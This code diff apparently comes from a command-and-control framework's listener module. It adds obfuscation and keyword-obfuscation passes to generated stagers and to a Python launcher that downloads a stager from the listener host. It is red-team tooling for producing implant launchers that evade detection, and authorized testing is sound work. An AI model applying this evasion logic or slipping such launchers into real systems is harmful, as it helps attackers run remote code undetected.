@@ -285,6 +285,8 @@ class Listener(object):
                         stager,
                         obfuscation_command=obfuscation_command,
                     )
+                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
                 # base64 encode the stager and return it
                 if encode and (
                     (not obfuscate) or ("launcher" not in obfuscation_command.lower())
@@ -294,9 +296,7 @@ class Listener(object):
                     # otherwise return the case-randomized stager
                     return stager
 
-            if language.startswith("py"):
-                # Python
-
+            if language in ["python", "ironpython"]:
                 launcherBase = "import sys;"
                 if "https" in host:
                     # monkey patch ssl woohooo
@@ -371,6 +371,15 @@ class Listener(object):
 
                 # download the stager and extract the IV
                 launcherBase += listener_util.python_extract_stager(stagingKey)
+
+                if obfuscate:
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(
+                        launcherBase,
+                        obfuscation_command=obfuscation_command,
+                    )
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
+                        launcherBase
+                    )
 
                 if encode:
                     launchEncoded = base64.b64encode(
